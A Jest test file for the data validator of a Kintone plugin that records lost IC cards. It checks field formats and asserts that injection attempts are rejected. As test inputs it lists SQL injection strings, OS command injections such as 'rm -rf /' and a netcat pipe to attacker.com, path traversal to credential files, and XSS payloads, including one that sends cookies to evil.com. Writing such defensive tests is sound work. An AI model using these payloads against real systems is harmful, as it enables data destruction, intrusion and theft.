/**
 * Kintone ICカード紛失対応プラグイン - データ検証テスト
 * DataValidatorクラスの包括的セキュリティテスト（IPA準拠）
 * 
 * @version 3.0.0
 * @author Kintone ICカード紛失対応チーム
 */

import DataValidator from '../src/js/data-validator.js';
import { jest } from '@jest/globals';

// モック設定
jest.mock('../src/js/security/input-validator.js');
jest.mock('../src/js/security/hash-manager.js');
jest.mock('../src/js/common/logger.js');

describe('DataValidator - Security Tests', () => {
    let validator;
    
    beforeEach(() => {
        validator = new DataValidator();
    });
    
    afterEach(() => {
        jest.clearAllMocks();
    });
    
    describe('SQLインジェクション対策テスト', () => {
        test('基本的なSQLインジェクション攻撃の検出', () => {
            const sqlInjectionAttempts = [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "' UNION SELECT * FROM sensitive_data --",
                "admin'--",
                "' OR 1=1 #",
                "'; INSERT INTO logs VALUES('hacked'); --",
                "' OR 'x'='x",
                "'; EXEC xp_cmdshell('dir'); --",
                "' AND 1=CONVERT(int, (SELECT TOP 1 username FROM users)) --",
                "1; DELETE FROM transactions; --"
            ];
            
            sqlInjectionAttempts.forEach(injection => {
                const result = validator.performSecurityCheck(injection, 'employeeName');
                
                expect(result.safe).toBe(false);
                expect(result.violation).toBe('SQL_INJECTION');
                expect(result.message).toContain('SQLインジェクション');
            });
        });
        
        test('正常なSQL文字を含む入力の適切な処理', () => {
            const legitimateInputs = [
                "田中SELECT（人事部）", // 日本語での「SELECT」
                "ORDER部門の佐藤さん",
                "INSERT通りの住所",
                "DROP商店",
                "SQL研修を受講"
            ];
            
            legitimateInputs.forEach(input => {
                const result = validator.performSecurityCheck(input, 'description');
                
                // 文脈的に正当な使用は許可される
                expect(result.safe).toBe(true);
            });
        });
        
        test('大文字小文字を混ぜたSQLインジェクション攻撃', () => {
            const mixedCaseAttacks = [
                "' Or '1'='1",
                "'; DrOp TaBlE users; --",
                "' UnIoN sElEcT * FROM admin --",
                "'; eXeC xp_cmdshell('whoami'); --"
            ];
            
            mixedCaseAttacks.forEach(attack => {
                const result = validator.performSecurityCheck(attack, 'employeeId');
                
                expect(result.safe).toBe(false);
                expect(result.violation).toBe('SQL_INJECTION');
            });
        });
    });
    
    describe('OSコマンドインジェクション対策テスト', () => {
        test('基本的なOSコマンドインジェクション攻撃の検出', () => {
            const osCommandAttacks = [
                "test; rm -rf /",
                "input && cat /etc/passwd",
                "data | nc attacker.com 1234",
                "value`whoami`",
                "text$(id)",
                "file; sudo rm /important",
                "path\\..\\..\\windows\\system32",
                "../../../etc/shadow",
                "input; chmod 777 /",
                "data && mkdir /tmp/hack"
            ];
            
            osCommandAttacks.forEach(attack => {
                const result = validator.performSecurityCheck(attack, 'lossLocation');
                
                expect(result.safe).toBe(false);
                expect(result.violation).toBe('OS_COMMAND_INJECTION');
                expect(result.message).toContain('OSコマンドインジェクション');
            });
        });
        
        test('パストラバーサル攻撃の検出', () => {
            const pathTraversalAttacks = [
                "../../../etc/passwd",
                "..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc//passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd"
            ];
            
            pathTraversalAttacks.forEach(attack => {
                const result = validator.performSecurityCheck(attack, 'description');
                
                expect(result.safe).toBe(false);
                expect(result.violation).toBe('OS_COMMAND_INJECTION');
            });
        });
    });
    
    describe('XSS攻撃対策テスト', () => {
        test('基本的なXSS攻撃の検出', () => {
            const xssAttacks = [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<iframe src="javascript:alert(\'XSS\')"></iframe>',
                '<svg onload=alert("XSS")>',
                '<body onload=alert("XSS")>',
                '<script src="http://evil.com/xss.js"></script>',
                'javascript:alert("XSS")',
                '<object data="javascript:alert(\'XSS\')"></object>',
                '<embed src="javascript:alert(\'XSS\')">',
                '<applet code="malicious.class">',
                '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">'
            ];
            
            xssAttacks.forEach(attack => {
                const result = validator.performSecurityCheck(attack, 'description');
                
                expect(result.safe).toBe(false);
                expect(result.violation).toBe('XSS');
                expect(result.message).toContain('クロスサイトスクリプティング');
            });
        });
        
        test('イベントハンドラーを使ったXSS攻撃', () => {
            const eventHandlerAttacks = [
                '<img src=x onerror=alert(1)>',
                '<input type=text onFocus=alert(1)>',
                '<select onchange=alert(1)>',
                '<textarea onkeypress=alert(1)>',
                '<button onclick=alert(1)>',
                '<form onsubmit=alert(1)>',
                '<div onmouseover=alert(1)>',
                '<span onload=alert(1)>'
            ];
            
            eventHandlerAttacks.forEach(attack => {
                const result = validator.performSecurityCheck(attack, 'notes');
                
                expect(result.safe).toBe(false);
                expect(result.violation).toBe('XSS');
            });
        });
    });
    
    describe('フィールド検証テスト', () => {
        test('従業員IDの検証', () => {
            const testCases = [
                { input: 'EMP001', expected: true },
                { input: 'USER123456', expected: true },
                { input: 'TEMP001', expected: true },
                { input: 'emp001', expected: true }, // 小文字も許可
                { input: 'E1', expected: false }, // 短すぎ
                { input: 'VERYLONGEMPLOYEEID123', expected: false }, // 長すぎ
                { input: 'EMP-001', expected: false }, // ハイフン不許可
                { input: 'EMP 001', expected: false }, // スペース不許可
                { input: '', expected: false }, // 空文字
                { input: null, expected: false } // null
            ];
            
            testCases.forEach(testCase => {
                const result = validator.validateField('employeeId', testCase.input);
                
                expect(result.valid).toBe(testCase.expected);
                
                if (testCase.expected) {
                    expect(result.sanitizedValue).toBeDefined();
                } else {
                    expect(result.error).toBeDefined();
                }
            });
        });
        
        test('従業員名の検証', () => {
            const testCases = [
                { input: '山田太郎', expected: true },
                { input: 'Yamada Taro', expected: true },
                { input: '田中　花子', expected: true }, // 全角スペース
                { input: 'Smith John Jr.', expected: false }, // ピリオド不許可
                { input: '佐藤123', expected: false }, // 数字不許可
                { input: '鈴木@太郎', expected: false }, // 記号不許可
                { input: 'a'.repeat(51), expected: false }, // 長すぎ
                { input: '', expected: false } // 空文字（必須フィールド）
            ];
            
            testCases.forEach(testCase => {
                const result = validator.validateField('employeeName', testCase.input);
                expect(result.valid).toBe(testCase.expected);
            });
        });
        
        test('メールアドレスの検証', () => {
            const testCases = [
                { input: 'user@example.com', expected: true },
                { input: 'test.email+tag@company.co.jp', expected: true },
                { input: 'user@subdomain.domain.com', expected: true },
                { input: 'invalid-email', expected: false },
                { input: '@example.com', expected: false },
                { input: 'user@', expected: false },
                { input: 'user@.com', expected: false },
                { input: 'user@com', expected: false },
                { input: '', expected: true }, // 任意フィールド
                { input: null, expected: true } // 任意フィールド
            ];
            
            testCases.forEach(testCase => {
                const result = validator.validateField('email', testCase.input);
                expect(result.valid).toBe(testCase.expected);
            });
        });
        
        test('電話番号の検証', () => {
            const testCases = [
                { input: '03-1234-5678', expected: true },
                { input: '090-1234-5678', expected: true },
                { input: '(052)123-4567', expected: true },
                { input: '052 123 4567', expected: true },
                { input: '0521234567', expected: true },
                { input: '123', expected: false }, // 短すぎ
                { input: '123456789012345678', expected: false }, // 長すぎ
                { input: 'abc-1234-5678', expected: false }, // 英字不許可
                { input: '03-1234-567@', expected: false }, // 記号不許可
            ];
            
            testCases.forEach(testCase => {
                const result = validator.validateField('phoneNumber', testCase.input);
                expect(result.valid).toBe(testCase.expected);
            });
        });
        
        test('日付の検証', () => {
            const testCases = [
                { input: '2024-01-15', expected: true },
                { input: '2023-12-31', expected: true },
                { input: '2024-02-29', expected: true }, // うるう年
                { input: '24-01-15', expected: false }, // 年が2桁
                { input: '2024/01/15', expected: false }, // スラッシュ区切り
                { input: '2024-1-15', expected: false }, // 月が1桁
                { input: '2024-01-5', expected: false }, // 日が1桁
                { input: '2024-13-01', expected: false }, // 無効な月
                { input: '2024-01-32', expected: false }, // 無効な日
                { input: 'invalid-date', expected: false }
            ];
            
            testCases.forEach(testCase => {
                const result = validator.validateField('lossDate', testCase.input);
                expect(result.valid).toBe(testCase.expected);
            });
        });
        
        test('時刻の検証', () => {
            const testCases = [
                { input: '09:30', expected: true },
                { input: '23:59', expected: true },
                { input: '00:00', expected: true },
                { input: '12:00', expected: true },
                { input: '24:00', expected: false }, // 無効な時
                { input: '09:60', expected: false }, // 無効な分
                { input: '9:30', expected: false }, // 時が1桁
                { input: '09:3', expected: false }, // 分が1桁
                { input: '09:30:45', expected: false }, // 秒まで含む
                { input: 'invalid-time', expected: false }
            ];
            
            testCases.forEach(testCase => {
                const result = validator.validateField('lossTime', testCase.input);
                expect(result.valid).toBe(testCase.expected);
            });
        });
    });
    
    describe('オブジェクト検証テスト', () => {
        test('完全なレポートデータの検証', () => {
            const validReportData = {
                employeeId: 'EMP001',
                employeeName: '山田太郎',
                department: '総務部',
                email: 'yamada@company.com',
                icCardNumber: '1234567890123456',
                cardType: 'MANACA',
                lossDate: '2024-01-15',
                lossTime: '09:30',
                lossLocation: '名古屋駅',
                description: 'ICカードを通勤時に紛失しました。',
                reportStatus: 'SUBMITTED'
            };
            
            const result = validator.validateObject(validReportData, [
                'employeeId', 'employeeName', 'icCardNumber', 'lossDate'
            ]);
            
            expect(result.valid).toBe(true);
            expect(result.errors).toHaveLength(0);
            expect(result.sanitizedData).toBeDefined();
            expect(result.dataHash).toBeDefined();
        });
        
        test('必須フィールド不足のエラー検出', () => {
            const incompleteData = {
                employeeId: 'EMP001',
                // employeeName が不足
                icCardNumber: '1234567890123456'
                // lossDate が不足
            };
            
            const result = validator.validateObject(incompleteData, [
                'employeeId', 'employeeName', 'icCardNumber', 'lossDate'
            ]);
            
            expect(result.valid).toBe(false);
            expect(result.errors.length).toBeGreaterThan(0);
            
            // 不足しているフィールドのエラーが含まれているか確認
            const missingFields = result.errors.filter(error => 
                error.error === 'MISSING_REQUIRED_FIELD'
            );
            expect(missingFields.length).toBeGreaterThan(0);
        });
        
        test('無効なフィールド値のエラー検出', () => {
            const invalidData = {
                employeeId: 'INVALID_ID_TOO_LONG_123456',
                employeeName: '<script>alert("xss")</script>',
                email: 'invalid-email-format',
                icCardNumber: 'abcd1234', // 英字含有
                lossDate: '2024/01/15', // 不正形式
                cardType: 'INVALID_CARD_TYPE'
            };
            
            const result = validator.validateObject(invalidData, ['employeeId']);
            
            expect(result.valid).toBe(false);
            expect(result.errors.length).toBeGreaterThan(0);
            
            // セキュリティ違反のエラーが含まれているか確認
            const securityViolations = result.errors.filter(error => 
                error.error === 'SECURITY_VIOLATION'
            );
            expect(securityViolations.length).toBeGreaterThan(0);
        });
    });
    
    describe('カスタム検証ルールテスト', () => {
        test('新しい検証ルールの追加', () => {
            const customRule = {
                pattern: /^[A-Z]{2}\d{6}$/,
                maxLength: 8,
                required: true,
                sanitize: true,
                description: 'カスタムID（英字2桁+数字6桁）'
            };
            
            const success = validator.addValidationRule('customId', customRule);
            expect(success).toBe(true);
            
            // 新しいルールでの検証
            const result = validator.validateField('customId', 'AB123456');
            expect(result.valid).toBe(true);
            
            const invalidResult = validator.validateField('customId', 'INVALID123');
            expect(invalidResult.valid).toBe(false);
        });
        
        test('不正なカスタムルールの拒否', () => {
            const invalidRule = {
                // 必須プロパティが不足
                description: '不正なルール'
            };
            
            const success = validator.addValidationRule('invalidRule', invalidRule);
            expect(success).toBe(false);
        });
    });
    
    describe('センシティブデータマスキングテスト', () => {
        test('様々な長さのデータマスキング', () => {
            const testCases = [
                { input: '1234567890', expected: '12****90' },
                { input: '123456', expected: '12**56' },
                { input: '123', expected: '***' },
                { input: 'ab', expected: '***' },
                { input: '', expected: '***' },
                { input: 'a', expected: '***' }
            ];
            
            testCases.forEach(testCase => {
                const masked = validator.maskSensitiveData(testCase.input);
                expect(masked).toBe(testCase.expected);
            });
        });
    });
    
    describe('パフォーマンステスト', () => {
        test('大量データの検証パフォーマンス', () => {
            const startTime = Date.now();
            
            // 1000件のデータを検証
            for (let i = 0; i < 1000; i++) {
                const testData = {
                    employeeId: `EMP${i.toString().padStart(3, '0')}`,
                    employeeName: `テストユーザー${i}`,
                    icCardNumber: `1234567890${i.toString().padStart(6, '0')}`
                };
                
                validator.validateObject(testData, ['employeeId']);
            }
            
            const endTime = Date.now();
            const processingTime = endTime - startTime;
            
            // 1000件の処理が5秒以内に完了することを確認
            expect(processingTime).toBeLessThan(5000);
        });
        
        test('メモリ使用量の監視', () => {
            const initialMemory = process.memoryUsage().heapUsed;
            
            // 大量の検証を実行
            for (let i = 0; i < 5000; i++) {
                validator.validateField('description', `テストデータ${i}`.repeat(10));
            }
            
            const finalMemory = process.memoryUsage().heapUsed;
            const memoryIncrease = finalMemory - initialMemory;
            
            // メモリ使用量が100MB以下であることを確認
            expect(memoryIncrease).toBeLessThan(100 * 1024 * 1024);
        });
    });
    
    describe('統計・メトリクステスト', () => {
        test('検証統計の記録', () => {
            // 様々な検証を実行
            validator.validateField('employeeId', 'EMP001'); // 成功
            validator.validateField('employeeName', '<script>'); // セキュリティ違反
            validator.validateField('email', 'invalid-email'); // フォーマットエラー
            validator.validateField('description', 'a'.repeat(1000)); // 長さ超過
            
            const stats = validator.getValidationStats();
            
            expect(stats.totalValidations).toBe(4);
            expect(stats.successfulValidations).toBe(1);
            expect(stats.failedValidations).toBe(3);
            expect(stats.securityViolations).toBe(1);
            expect(stats.violationTypes.xss).toBe(1);
            expect(stats.violationTypes.excessiveLength).toBe(1);
            expect(stats.violationTypes.invalidFormat).toBe(1);
        });
        
        test('統計のリセット機能', () => {
            // 統計データを生成
            validator.validateField('employeeId', 'EMP001');
            validator.validateField('employeeName', '<script>');
            
            let stats = validator.getValidationStats();
            expect(stats.totalValidations).toBe(2);
            
            // 統計をリセット
            validator.resetStats();
            
            stats = validator.getValidationStats();
            expect(stats.totalValidations).toBe(0);
            expect(stats.successfulValidations).toBe(0);
            expect(stats.failedValidations).toBe(0);
            expect(stats.securityViolations).toBe(0);
        });
    });
    
    describe('エラーハンドリングテスト', () => {
        test('例外的なケースの処理', () => {
            const extremeCases = [
                { field: 'employeeId', value: null },
                { field: 'employeeId', value: undefined },
                { field: 'employeeId', value: {} },
                { field: 'employeeId', value: [] },
                { field: 'employeeId', value: function() {} },
                { field: 'nonexistent', value: 'test' }
            ];
            
            extremeCases.forEach(testCase => {
                const result = validator.validateField(testCase.field, testCase.value);
                expect(result).toBeDefined();
                expect(result.valid).toBeDefined();
            });
        });
    });
});

describe('DataValidator - Integration Tests', () => {
    let validator;
    
    beforeEach(() => {
        validator = new DataValidator();
    });
    
    test('完全なICカード紛失報告ワークフロー', () => {
        // ステップ1: 基本情報の検証
        const basicInfo = {
            employeeId: 'EMP001',
            employeeName: '山田太郎',
            department: '総務部',
            email: 'yamada@company.com'
        };
        
        const basicResult = validator.validateObject(basicInfo, ['employeeId', 'employeeName']);
        expect(basicResult.valid).toBe(true);
        
        // ステップ2: ICカード情報の検証
        const cardInfo = {
            icCardNumber: '1234567890123456',
            cardType: 'MANACA',
            lossDate: '2024-01-15',
            lossLocation: '名古屋駅'
        };
        
        const cardResult = validator.validateObject(cardInfo, ['icCardNumber', 'lossDate']);
        expect(cardResult.valid).toBe(true);
        
        // ステップ3: 全体データの統合検証
        const completeData = { ...basicInfo, ...cardInfo };
        const completeResult = validator.validateObject(completeData, [
            'employeeId', 'employeeName', 'icCardNumber', 'lossDate'
        ]);
        
        expect(completeResult.valid).toBe(true);
        expect(completeResult.dataHash).toBeDefined();
    });
    
    test('セキュリティ攻撃シナリオのテスト', () => {
        // 攻撃者が悪意のあるデータを送信するシナリオ
        const maliciousData = {
            employeeId: "'; DROP TABLE employees; --",
            employeeName: '<script>document.location="http://evil.com/steal?data="+document.cookie</script>',
            description: 'normal text; rm -rf /',
            email: '<img src=x onerror=alert(document.domain)>@evil.com'
        };
        
        const result = validator.validateObject(maliciousData, ['employeeId']);
        
        // 全ての攻撃が検出され、データが無効とマークされることを確認
        expect(result.valid).toBe(false);
        expect(result.errors.length).toBeGreaterThan(0);
        
        // セキュリティ違反が記録されていることを確認
        const stats = validator.getValidationStats();
        expect(stats.securityViolations).toBeGreaterThan(0);
    });
});
